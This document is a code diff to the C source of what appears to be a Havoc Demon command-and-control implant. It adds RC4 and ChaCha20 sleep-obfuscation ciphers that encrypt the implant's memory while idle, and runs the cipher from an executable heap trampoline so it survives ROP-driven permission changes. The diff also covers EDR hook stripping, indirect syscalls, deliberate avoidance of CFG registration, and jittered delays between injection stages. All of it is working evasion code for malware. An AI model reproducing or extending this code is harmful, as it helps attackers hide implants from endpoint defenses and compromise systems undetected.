@@ -27,8 +27,12 @@
 /* [HVC-014 2026-04-28] AES-256-CTR for encrypted CONFIG_BYTES embedding. */
 #include <crypt/AesCrypt.h>
 
-/* [HVC-031 Sub-4] ntdll unhook — strip EDR inline hooks at startup. */
+/* [HVC-031 Sub-4] ntdll unhook - strip EDR inline hooks at startup. */
 #include <core/NtdllUnhook.h>
+
+/* [HVC-045] Manual RC4 + ChaCha20 sleep ciphers (replaces advapi32!SystemFunction032). */
+#include <crypt/Rc4Crypt.h>
+#include <crypt/ChaCha20Crypt.h>
 
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
@@ -428,6 +432,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
         Instance->Win32.NtQueryObject                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
         Instance->Win32.NtTraceEvent                      = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
+        Instance->Win32.NtDelayExecution                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTDELAYEXECUTION ); /* HVC-046 */
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
@@ -548,7 +553,14 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* Parse config */
     DemonConfig();
 
-    /* Initialize indirect syscalls before UnhookNtdll — UnhookNtdll uses SysNtProtectVirtualMemory
+    /* [HVC-045] Select sleep cipher function from profile/builder config; never a compile-time override.
+     * SleepCipherFunc is called via ROP chain in ObfTimer/ObfFoliage with the same USTRING convention. */
+    if ( Instance->Config.Implant.SleepCipher == SLEEP_CIPHER_CHACHA20 )
+        Instance->Win32.SleepCipherFunc = (PVOID)ChaCha20CryptUString;
+    else
+        Instance->Win32.SleepCipherFunc = (PVOID)RC4CryptUString;
+
+    /* Initialize indirect syscalls before UnhookNtdll - UnhookNtdll uses SysNtProtectVirtualMemory
      * to bypass the EDR hook on NtProtectVirtualMemory. SYSCALL_INVOKE requires SysAddress and
      * the NtProtectVirtualMemory SSN to be populated; SysInitialize provides both.
      * SysInitialize only needs Instance->Modules.Ntdll which is available at this point. */
@@ -657,6 +669,75 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* Global Objects */
     Instance->Dotnet = NULL;
 
+    /* [HVC-045] Allocate an executable heap trampoline for SleepCipherFunc.
+     * The compiled-in cipher (RC4CryptUString or ChaCha20CryptUString) lives inside the Demon
+     * image. Sleep obfuscation ROP chains call VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
+     * BEFORE invoking SleepCipherFunc - this strips the execute bit from the image, causing an
+     * access violation on the cipher call. A separate heap allocation is outside [ImageBase,
+     * ImageBase+ImageSize) so VirtualProtect never affects it; the cipher stays callable through
+     * every sleep cycle. Sub-functions are always_inline so the USTRING wrapper is self-contained
+     * (no relative CALLs back into image memory). */
+    {
+        /* Compute safe copy bound: in KaynLoader mode KVirtualMemory is exactly KMemSize bytes;
+         * reading past it faults. Use TxtBase+TxtSize (set from KaynArgs) for shellcode mode, or
+         * ModuleBase+ModuleSize for EXE/DLL. Both bounds guarantee the full cipher function is
+         * captured because the function is always within the section (linker invariant). */
+        PBYTE  AllocEnd = NULL;
+        SIZE_T CopyLen  = 0;
+
+        if ( Instance->Session.TxtBase && Instance->Session.TxtSize )
+            AllocEnd = (PBYTE)Instance->Session.TxtBase + Instance->Session.TxtSize;
+        else if ( Instance->Session.ModuleBase && Instance->Session.ModuleSize )
+            AllocEnd = (PBYTE)Instance->Session.ModuleBase + Instance->Session.ModuleSize;
+
+        if ( AllocEnd > (PBYTE)Instance->Win32.SleepCipherFunc )
+            CopyLen = (SIZE_T)( AllocEnd - (PBYTE)Instance->Win32.SleepCipherFunc );
+
+        CopyLen = ( CopyLen > 0x2000 ) ? 0x2000 : CopyLen;
+
+        if ( CopyLen > 0 )
+        {
+            PVOID  TrampoBase = NULL;
+            SIZE_T TrampoSize = 0x2000;
+            ULONG  TrampoOld  = 0;
+
+            if ( NT_SUCCESS( SysNtAllocateVirtualMemory( NtCurrentProcess(), &TrampoBase, 0,
+                                                          &TrampoSize, MEM_COMMIT | MEM_RESERVE,
+                                                          PAGE_READWRITE ) ) )
+            {
+                /* manual byte loop: avoids __builtin_memcpy calling external memcpy
+                 * which is unresolved in -nostdlib shellcode builds */
+                { PBYTE _s = (PBYTE)Instance->Win32.SleepCipherFunc, _d = (PBYTE)TrampoBase;
+                  for ( DWORD _i = 0; _i < (DWORD)CopyLen; _i++ ) _d[ _i ] = _s[ _i ]; }
+
+                /* aliasing guard: NtProtect page-aligns BaseAddress/RegionSize in-place;
+                 * use separate locals so TrampoBase keeps the original allocation address */
+                PVOID  ProtAddr = TrampoBase;
+                SIZE_T ProtSize = TrampoSize;
+
+                if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), &ProtAddr,
+                                                             &ProtSize, PAGE_EXECUTE_READ,
+                                                             &TrampoOld ) ) )
+                {
+                    Instance->Win32.SleepCipherFunc = TrampoBase;
+                    PUTS( "[HVC-045] SleepCipherFunc: executable trampoline ready" )
+                }
+                else
+                {
+                    PUTS( "[HVC-045] SleepCipherFunc: NtProtect(RX) failed - sleep may crash" )
+                }
+            }
+            else
+            {
+                PUTS( "[HVC-045] SleepCipherFunc: NtAlloc failed - sleep may crash" )
+            }
+        }
+        else
+        {
+            PUTS( "[HVC-045] SleepCipherFunc: bounds unavailable - sleep may crash" )
+        }
+    }
+
     /* if cfg is enforced (and if sleep obf is enabled)
      * add every address we're going to use to the Cfg address list
      * to not raise an exception while performing sleep obfuscation */
@@ -668,7 +749,13 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtContinue );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtSetContextThread );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtGetContextThread );
-        CfgAddressAdd( Instance->Modules.Advapi32, Instance->Win32.SystemFunction032 );
+        /* NOTE: SleepCipherFunc (heap trampoline) is intentionally NOT registered here.
+         * CfgAddressAdd() reads e_lfanew from its first argument as a PE image base —
+         * passing NULL causes a NULL dereference that crashes the host process in any
+         * CFG-enforced target (all modern Windows processes). The cipher is called via
+         * NtContinue (Foliage — kernel sets RIP directly, bypasses CFG) and via a
+         * byte-scanned jmp-rax gadget in ntdll (Timer — not a compiler-instrumented
+         * call site); neither path triggers a CFG bitmap check. */
 
         /* ekko sleep obf */
         CfgAddressAdd( Instance->Modules.Kernel32, Instance->Win32.WaitForSingleObjectEx );
@@ -776,8 +863,10 @@ VOID DemonConfig()
     Instance->Config.Implant.UnhookNtdll        = ParserGetInt32( &Parser );
     /* HideModules — TRUE means unlink dynamically loaded modules from PEB LDR lists */
     Instance->Config.Implant.HideModules        = ParserGetInt32( &Parser );
-    /* PeStomp — TRUE means stomp PE header region during default sleep; off by default (ISS-037 fix) */
+    /* PeStomp - TRUE means stomp PE header region during default sleep; off by default (ISS-037 fix) */
     Instance->Config.Implant.PeStomp            = ParserGetInt32( &Parser );
+    /* SleepCipher - SLEEP_CIPHER_RC4 (0) or SLEEP_CIPHER_CHACHA20 (1); authoritative from profile/UI */
+    Instance->Config.Implant.SleepCipher        = ParserGetInt32( &Parser );
 
     /* Verbose - enable verbose debug logging (profile-configured) */
     Instance->Config.Implant.Verbose        = ParserGetInt32( &Parser );
@@ -798,6 +887,10 @@ VOID DemonConfig()
         InjectSpoofFunc = ParserGetString( &Parser, &Len ); if ( Len <= 1 || !InjectSpoofFunc[0] ) InjectSpoofFunc = NULL;
         InjectSpoofOffset = ParserGetInt32( &Parser );
     }
+
+    /* HVC-046: jittered delay between injection stages (alloc -> protect -> execute) */
+    Instance->Config.Implant.ExecDelay       = (DWORD)ParserGetInt32( &Parser );
+    Instance->Config.Implant.ExecDelayJitter = (DWORD)ParserGetInt32( &Parser );
 
 #ifdef TRANSPORT_HTTP
     Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
